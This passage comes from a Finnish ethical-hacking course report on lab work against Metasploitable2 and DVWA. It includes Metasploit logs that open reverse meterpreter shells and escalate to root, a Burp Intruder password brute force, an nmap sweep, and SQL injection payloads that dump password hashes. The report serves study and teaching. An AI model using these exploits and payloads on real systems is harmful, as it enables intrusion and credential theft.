msf6 exploit(multi/http/tomcat_mgr_deploy) > set lhost 192.168.60.10
lhost => 192.168.60.10
msf6 exploit(multi/http/tomcat_mgr_deploy) > set rport 8180
rport => 8180
msf6 exploit(multi/http/tomcat_mgr_deploy) > set Httpusername tomcat
Httpusername => tomcat
msf6 exploit(multi/http/tomcat_mgr_deploy) > set Httppassword tomcat
Httppassword => tomcat
msf6 exploit(multi/http/tomcat_mgr_deploy) > exploit
[*] Started reverse TCP handler on 192.168.60.10:4444 
[*] Attempting to automatically select a target...
[*] Automatically selected target "Linux x86"
[*] Uploading 6236 bytes as 9WYBVIE72IjOSvB4R4n6i68Q.war ...
[*] Executing /9WYBVIE72IjOSvB4R4n6i68Q/G7k1TswwlECltSBPJrFFKiF6I8S.jsp...
[*] Undeploying 9WYBVIE72IjOSvB4R4n6i68Q ...
[*] Sending stage (58829 bytes) to 192.168.60.9
[*] Meterpreter session 1 opened (192.168.60.10:4444 -> 192.168.60.9:41921) at 2023-12-02 17:14:21 -0500

meterpreter > 
```

T√§m√§n j√§lkeen tuli ilmoitus, ett√§ Meterpreter istunto 1 on avattu. Kokeilin komentoa "help", joka antoi erilaisia vaihtoehtoja komennoista. Kokeilin, mill√§ k√§ytt√§j√§id:ll√§ olen sis√§ll√§.

```console
meterpreter > getuid
Server username: tomcat55
meterpreter > 
```

Tuloste vaikutti tavalliselta k√§ytt√§j√§lt√§, jolla ei ole laajempia oikeuksia. T√§ss√§ vaiheessa siirsin meterpreter istunnon taustalle komennolla ```background```. Sen j√§lkeen oli aika etsi√§ uutta exploitia, jolla voisin korottaa oikeuksiani. Udev versiot 1.4.1 alasp√§in eiv√§t varmenna, ett√§ netlink viestit tulevat kernelilt√§. T√§m√§n vuoksi lokaalit k√§ytt√§j√§t pystyv√§t korottamaan oikeuksia l√§hett√§m√§ll√§ netlink viestej√§ "from userland". T√§h√§n l√∂ytyi exploit  ```/linux/local/udev_netlink```. Ajoin suoraan:

```console
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/http/tomcat_mgr_deploy) > use exploit/linux/local/udev_netlink 
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
```
T√§m√§n j√§lkeen tarkistin viel√§ "show options", puuttuiko asetuksista jotain vaatimuksia. T√§ytyi sinne lis√§t√§ oman hostin IP-osoite. T√§m√§n lis√§tty√§ni asetin istunnoksi tuon voimassaolevan "1", ja ajoin "run".

```console
msf6 exploit(linux/local/udev_netlink) > set lhost 192.168.60.10
lhost => 192.160.60.10
msf6 exploit(linux/local/udev_netlink) > set session 1
session => 1
msf6 exploit(linux/local/udev_netlink) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: java
[!]  * missing Meterpreter features: stdapi_fs_chmod
[*] Started reverse TCP handler on 192.168.60.10:4444 
[*] Attempting to autodetect netlink pid...
[*] Meterpreter session, using get_processes to find netlink pid
[*] udev pid: 2422
[+] Found netlink pid: 2421
[*] Writing payload executable (207 bytes) to /tmp/pGTjTPDBkF
[*] Writing exploit executable (1879 bytes) to /tmp/GZhdRZZYMK
[*] chmod'ing and running it...
[*] Sending stage (1017704 bytes) to 192.168.60.9
[*] Meterpreter session 2 opened (192.168.60.10:4444 -> 192.168.60.9:54550) at 2023-12-02 17:31:24 -0500

meterpreter > 
```
T√§m√§ vaikutti lupaavalta, sill√§ sain ilmoituksen, ett√§ meterpreter istunto 2 oli avattu. Testasin siis "getuid".

```console
meterpreter > getuid
Server username: root
```

J√§ n√§in olin sis√§ll√§ "as root".

### Taktiikkana Credential Access

#### Tekniikka T1110.001	Password Guessing (Brute force)

Hy√∂kk√§√§j√§t, joilla ei ole hallussaan k√§ytt√§j√§n tunnistetietoja, voivat arvata salasanoja yritt√§√§kseen p√§√§sy√§ k√§ytt√§j√§tilille. Hy√∂kk√§√§j√§ voi arvailla salasanoja hy√∂dynt√§en valmiita listoja yleisesti k√§ytetyist√§ salasanoista. T√§m√§ voi olla tosin riski, sill√§ useat yritykset saattavat johtaa k√§ytt√§j√§tilin lukkiutumiseen, riippuen organisaation kirjautumisk√§yt√§nn√∂ist√§.

L√∂ysin *[tutoriaalin](https://www.youtube.com/watch?v=2_lswM1S264)*, jossa hy√∂dynnettiin Burp:n intruder-toimintoa. P√§√§tin hy√∂dynt√§√§ t√§t√§ DVWA:n Brute Force -teht√§v√§ss√§. Ensin sy√∂tin sis√§√§nkirjautumislomakkeeseen k√§ytt√§j√§nimen "user" ja salasanan "user". 

![brute1](https://github.com/jjenska/PenTest/assets/105623785/15c8db68-0b28-402c-ad69-e9551db0ef8e)

T√§m√§n j√§lkeen nappasin pyynn√∂n Burp:ssa, ja siirsin hiiren oikealla "send to intruder". Sielt√§ valitsin t√§ss√§ tapauksessa arvoiksi sek√§ k√§ytt√§j√§nimen, ett√§ salasanan. Eli kuten kuvassa n√§kyy, maalattiin molemmat arvot ja klikattiin "add":

![brute2](https://github.com/jjenska/PenTest/assets/105623785/203d4ad2-65ae-44ed-bcab-58de027d5c4d)

T√§m√§n j√§lkeen asetin hy√∂kk√§yksen tyypiksi "cluster bomb", jotta voisin asettaa useamman payloadin. 

![brute3](https://github.com/jjenska/PenTest/assets/105623785/516722ec-8750-47e5-9d98-5a893f4a7628)

Siirryin ylh√§√§lt√§ v√§lilehdelt√§ payloads osioon, jossa ensimm√§inen payload oli valmiiksi numerolla "1", ja tyyppin√§ "simple list". T√§ss√§ tapauksessa oli tarkoitus hy√∂dynt√§√§ esim. valmiita sanalistoja, joten siksi tyyppin√§ tuo. Payloadin asetuksista pystyi latamaan joko valmiin sanalistan, tai lis√§√§m√§√§n add-painikkeesta arvoja itse. N√§in yksinkertaisessa esimerkiss√§ asetin ainoastaan 4 eri arvoa (admin, administrator, user1, user).

![brute4](https://github.com/jjenska/PenTest/assets/105623785/c58b669c-f4f1-4321-b59f-b80387d711dc)

T√§m√§n j√§lkeen valikosta vaihdettiin "payload set" numeroksi 2. Tyyppin√§ edelleen sama lista. T√§t√§ varten latasin *[GitHub:sta](https://github.com/DavidWittman/wpxmlrpcbrute/blob/master/wordlists/1000-most-common-passwords.txt)* .txt tiedoston, johon oli listattu 1000 yleisint√§ salasanaa. Klikkasin siis payloadin asetuksista "load..." -> "open". 

![brute5](https://github.com/jjenska/PenTest/assets/105623785/1657ab5e-2850-448d-8acd-48e32a4de100)

Kun olin avannut tiedoston, klikkasin ylh√§√§lt√§ oikealta "start attack". 

![brute6](https://github.com/jjenska/PenTest/assets/105623785/5e2c874d-927d-4589-a499-ffc935af3d63)

Burp alkoi k√§yd√§ l√§pi listoja, statuksella 200 tuli runsaasti vastauksia. 1000 sanan m√§√§r√§ oli my√∂s t√§ysin liioiteltua, koska tiedossa oli jo admin tunnuksen salasana, mutta tulipahan kokeiltua ominaisuus. Usean pyynn√∂n pituus n√§ytti olevan sama, eli 4618 tai 4617. Yksi poikkeus listalta kuitenkin l√∂ytyi: pituus 4660. T√§m√§n kohdalla n√§kyi "admin" ja "password".

![brute7](https://github.com/jjenska/PenTest/assets/105623785/de3f6447-27ef-4df3-b16a-32b68006d19a)

T√§m√§h√§n oli jo tiedossa, tarkistin kuitenkin viel√§ pyynt√∂√∂n tulleen vastauksen, ja render√∂in sen:

![brute8](https://github.com/jjenska/PenTest/assets/105623785/1006eb91-a1b4-4465-8ef9-9fc5b3b763f3)

T√§ss√§ tapauksessa hy√∂dynsin sek√§ k√§ytt√§j√§tunnusta, ett√§ salasanaa. Mitren kuvaamassa tilanteessa hy√∂kk√§√§j√§ll√§ todenn√§k√∂isesti olisi jo lista k√§ytt√§j√§tunnuksista, joiden salasana voitaisiin yritt√§√§ arvata brute force hy√∂kk√§yksell√§. T√§h√§n p√§√§ttyiv√§t taktiikkani (3/5), valitettavasti aikani loppui kesken, kenties ehdin my√∂hemmin t√§ydent√§√§ vastaustani.

### üÜò T√§ysin ylim√§√§r√§iset teht√§v√§t, jotka eiv√§t liity teht√§v√§nantoon (ymm√§rsin kohdan c) aluksi v√§√§rin ü§¶‚Äç‚ôÄÔ∏è)

#### T1595.001	Scanning IP Blocks

Hy√∂kk√§√§j√§t voivat skannata kohteen IP-lohkoja, joista voi olla hy√∂ty√§ kohdistettuun hy√∂kk√§ykseen. Julkisia IP-osoitteita voidaan jakaa organisaatiolle lohkona tai per√§kk√§isen√§ osoiteavaruutena *([Mitre - Scanning IP Blocks](https://attack.mitre.org/techniques/T1595/001/))*. Teht√§v√§√§ varten minulla oli k√§yt√∂ss√§ host-only virtuaaliverkko Kalin ja Metasploitable2 v√§lill√§. Ajatuksena oli, ett√§ hy√∂kk√§√§j√§ll√§ olisi tietty kohdeosoitealue, jota skannata, ja selvitt√§√§ samalla, onko IP-osoite ylip√§√§t√§√§n ylh√§√§ll√§. Skannaus on kevyempi, koska se ei tee porttiskannausta, ja tapahtuu melko huomaamattomasti. Hy√∂kk√§√§j√§lle arvokasta tietoa on, mitk√§ hostit ovat ylh√§√§ll√§.

```console
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo nmap -sn 192.168.60.0/24
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-01 18:31 EET
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.60.1
Host is up (0.00016s latency).
MAC Address: 08:00:27:93:8F:57 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.60.8
Host is up (0.00023s latency).
MAC Address: 08:00:27:D4:7A:6C (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.60.7
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.31 seconds
```

Skannauksen avulla sai selville, ett√§ yhteens√§ 3 hostia on ylh√§√§ll√§. N√§ist√§ ensimm√§inen on DHCP-palvelimen, toinen Metasploitable2:n ja kolman skannauksen tehdyn Kalin. T√§ss√§ tapauksessa hy√∂kk√§√§j√§lle kiinnostava kohde olisi tuo ```.8``` p√§√§tteinen IP, jolle voisi tehd√§ tarkemman skannauksen esim. versioista (```-sV```). 

#### T1589.001	Credentials (Gather Victim Identity Information)

Hy√∂kk√§√§j√§t voivat ker√§t√§ tunnistetietoja mahdollisilta uhreilta eri tavoin, kuten tietoja kalastelemalla. He voivat my√∂s rikkoa sovelluksia lis√§√§m√§ll√§ niihin haitallista sis√§lt√∂√§, joka on suunniteltu ker√§√§m√§√§n verkkosivustolla vierailevien tunnistetietoja ev√§steiden avulla. *([Mitre - Credentials](https://attack.mitre.org/techniques/T1589/001/))* T√§ss√§ osiossa k√§vin l√§pi DVWA:n SQL-injection kohtaa, jossa piti l√∂yt√§√§ 5 k√§ytt√§j√§√§, joiden ID:t olivat 1-5. En ole varma vastaako t√§m√§ t√§ysin kyseist√§ tekniikkaa, mutta injektion avulla olisi mahdollista saada kenties k√§ytt√§j√§nimet ja salasanat. 

Kun tarkastelin teht√§v√§n koodia klikkaamalla "View Source", huomasin, ett√§ k√§ytt√§j√§n sy√∂tt√§m√§√§ tietoa ei validoida mitenk√§√§n:

```php
// poistettu ep√§olennaiset rivit koodista
    // Get input
    $id = $_REQUEST[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
// poistettu ep√§olennaiset rivit koodista
```
Kokeilin ensin hakea normaalisti id:ll√§ 1 yhden k√§ytt√§j√§n tiedot:

![cred1](https://github.com/jjenska/PenTest/assets/105623785/a7058a25-b105-4004-bec7-329e90b2d209)

P√§√§tin kokeilla yksinkertaista syntaksia *[w3schools:n sivuilta](https://www.w3schools.com/sql/sql_injection.asp)* ```"oe" "="```. Se toimi, sill√§ sain kaikki k√§ytt√§j√§t tulostumaan sovellukseen.

![cred2](https://github.com/jjenska/PenTest/assets/105623785/9726b635-cb11-4d43-99ff-28fc62f6e9ee)

Katsoin annetusta vinkist√§, ett√§ t√§ss√§ tulisi k√§ytt√§ ```UNION SELECT``` lausetta, jotta saataisiin my√∂s mahdolliset salasanat n√§kyviin. Kokeilin Portswiggeriss√§kin k√§ytetty√§ testi√§ ```'UNION SELECT+'aaa','bbb'--```, mutta sain Bupr:ssa "Internal Server Error". Kokeilin my√∂s muuttaa syntaksia ilman "+" merkki√§, mutta tuloksetta. P√§√§tin vilkaista, l√∂ytyisik√∂ teht√§v√§n ratkaisemiseen jonkinlaista ohjetta. Youtube *[tutoriaalista](https://www.youtube.com/watch?v=5bj1pFmyyBA)* l√∂ysin vastauksen, ja ainakin kommenttini syntaksissa oli pieless√§. MariaDB k√§ytt√§√§ kommenteissa merkki√§ "#". Muutettuani sen, sain syntaksin palauttamaan jotain.

![cred3](https://github.com/jjenska/PenTest/assets/105623785/24869f49-a9dc-49c5-aac2-1ace27472843)

Tutoriaalissa hy√∂dynnettiin my√∂s suoraan Portswiggerin lausetta ```'UNION SELECT username,password FROM users#```. Kokeilin t√§t√§, vaikka tiesin jo, ett√§ username ei ole oikea sarakkeen nimi. Tutorialissa t√§st√§ tuli virheviesti, mutta localhostini antoi vain viestin "This page isn't working" ja Burp "Internal Server Error". T√§ss√§ vaiheessa en ryhtynyt selvitt√§m√§√§n, mist√§ johtui, ettei selaimeni ilmoittanut tarkempia virheilmoituksia. Kun muutin sarakkeen "username" -> "user", sain kaikki k√§ytt√§j√§t ja salasanat listautumaan oikein.

![cred4](https://github.com/jjenska/PenTest/assets/105623785/d07875e3-0c23-47b4-9793-52f46517fd3a)

T√§ss√§ tapauksessa First Name -sarakkeeseen n√§ytti tulostuvan salasanan tiiviste, ja Surname kohtaan k√§ytt√§j√§n nimi. Tiivisteet voisi kokeilla viel√§ murtaa...

# L√§hteet:

[Exploit Database](https://www.exploit-db.com/exploits/23077)

[GitHub - DVWA repository](https://github.com/digininja/DVWA.git)

[GitHub - David Wittman: 1000 most common passwords](https://github.com/DavidWittman/wpxmlrpcbrute/blob/master/wordlists/1000-most-common-passwords.txt)

[Halonen, Rajala ja Ollikainen - PhishSticks](https://github.com/therealhalonen/PhishSticks/)

[Kali Linux - Tools: wordlists](https://www.kali.org/tools/wordlists/)

[Karvinen Tero - h6](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h6-attaaack)

[Medium.com - Metasploit to test for vulnerabilities](https://medium.com/@alexandergts98/using-kali-linux-nessus-and-metasploit-to-test-for-vulnerabilities-6080a8d5214)

[Ollikainen - PhishSticks: installing Windows 10 on a virtual machine](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/windows.md)

[w3schools](https://www.w3schools.com/sql/sql_injection.asp)

[Youtube - DVWA SQL Injection](https://www.youtube.com/watch?v=5bj1pFmyyBA)

[Youtube - DVWA Installation Tutorial](https://www.youtube.com/watch?v=WkyDxNJkgQ4)

[Youtube - Ethical Hacking 101](https://www.youtube.com/watch?v=2_lswM1S264)

